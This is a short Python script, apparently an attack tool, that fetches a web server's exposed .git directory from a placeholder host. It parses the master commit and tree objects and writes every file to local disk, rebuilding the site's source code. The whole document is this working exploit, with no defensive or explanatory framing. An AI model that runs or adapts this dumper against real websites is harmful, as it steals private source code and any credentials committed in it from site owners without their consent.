import requests, zlib, os

url = "http://domain/.git/"

def getpath(hash):
    return hash[:2] + "/" + hash[2:]

import binascii

def praise_our_lord_and_savior_the_almighty_sysadmin(baum):
    baum = baum.split(b'\0', 1)[1]
    while baum:
        mode, baum = baum.split(b' ', 1)
        filename, baum = baum.split(b'\0', 1)
        rawsha1 = baum[:20]
        sha1 = binascii.hexlify(rawsha1)
        baum = baum[20:]
        yield (mode, filename, sha1)

def gettree(tree):
    return [(a[1],a[2]) for a in praise_our_lord_and_savior_the_almighty_sysadmin(tree)]

def traverse(tuple, currpath):
    print(currpath)
    print("    " + str(tuple))
    filename = tuple[0].decode("utf-8")
    hash = tuple[1].decode("utf-8")
    r = requests.get(url+"objects/"+getpath(hash))
    obj = zlib.decompress(r.content)
    if obj[:4] == b'tree':
        currpath += filename + "/"
        os.mkdir(currpath)
        tree = gettree(obj)
        for t in tree:
            traverse(t, currpath)
    elif obj[:4] == b'blob':
        f = open(currpath + filename, "w")
        f.buffer.write(obj.split(b"\x00")[1])

head = requests.get(url+"refs/heads/master").text[:-1]
commit = zlib.decompress(requests.get(url+"objects/"+getpath(head)).content)
print(commit)
traverse((b"git", commit.split(b"\n")[0].split(b" ")[2]), "./")

